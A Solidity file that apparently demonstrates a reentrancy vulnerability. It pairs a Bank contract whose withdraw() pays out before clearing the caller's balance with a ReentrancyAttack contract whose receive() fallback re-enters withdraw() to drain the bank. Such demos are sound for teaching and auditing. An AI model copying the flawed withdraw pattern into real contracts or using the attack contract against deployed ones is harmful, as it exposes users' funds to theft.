//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Bank {
    mapping(address => uint256) public balance;
    uint256 public totalDeposit;

    function ethBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
        totalDeposit += msg.value;
    }

    function withdraw() external {
        require(balance[msg.sender] > 0, "Bank: no balance");
        msg.sender.call{value: balance[msg.sender]}("");
        totalDeposit -= balance[msg.sender];
        balance[msg.sender] = 0;
    }
}

contract ReentrancyAttack {
    IBank bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function doDeposit() external payable {
        bank.deposit{value: msg.value}();
    }

    function doWithdraw() external {
        bank.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        bank.withdraw();
    }
}
